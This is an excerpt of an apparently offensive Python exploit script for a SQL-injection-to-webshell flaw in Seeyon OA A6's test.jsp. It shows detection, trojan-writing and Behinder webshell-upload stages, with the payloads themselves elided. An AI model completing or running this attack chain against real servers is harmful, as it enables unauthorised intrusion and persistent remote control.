...
def POC_1(target_url):
    ...
    print(now_time() + " [INFO]     正在检测致远OA A6 test.jsp SQL注入Getshell漏洞")
    ...
    try:
        ...
        if '序号' in response.text and "@@basedir" in response.text and response.status_code == 200:
            ...
            print(
                now_time() + " [SUCCESS]  目标 {} 存在致远OA A6 test.jsp SQL注入Getshell漏洞, web绝对路径: {}".format(
                    target_url,
                    OA_dir))
            ...
            print(now_time() + " [WARNING]  致远OA A6 test.jsp SQL注入Getshell漏洞利用失败")
    except:
...
def POC_2(target_url, OA_dir, webshell_name):
    ...
    try:
        ...
        if 'already' in response.text and response.status_code == 200:
            print(now_time() + " [WARNING]  文件写入木马上传失败, 目标已存在相同文件, 请重新运行")
        elif "No Data" in response.text and response.status_code == 200:
            print(now_time() + " [SUCCESS]  文件写入木马上传成功, 上传绝对路径: {}".format(OA_dir))
            POC_3(target_url, webshell_name)
        else:
            print(now_time() + " [WARNING]  木马上传失败, 请手动尝试进一步利用")
    except:
        print(now_time() + " [ERROR]    目标请求失败")
...
def POC_3(target_url, webshell_name):
    ...
    try:
        ...
        if response.status_code == 200:
            print(now_time() + " [SUCCESS]  冰蝎三默认木马上传成功: {}yyoa/{}".format(target_url, rebe_webshell))
        else:
            print(now_time() + " [WARNING]  木马上传失败, 可能被拦截, 请手动尝试进一步利用")
    except:
        print(now_time() + " [ERROR]    目标请求失败")
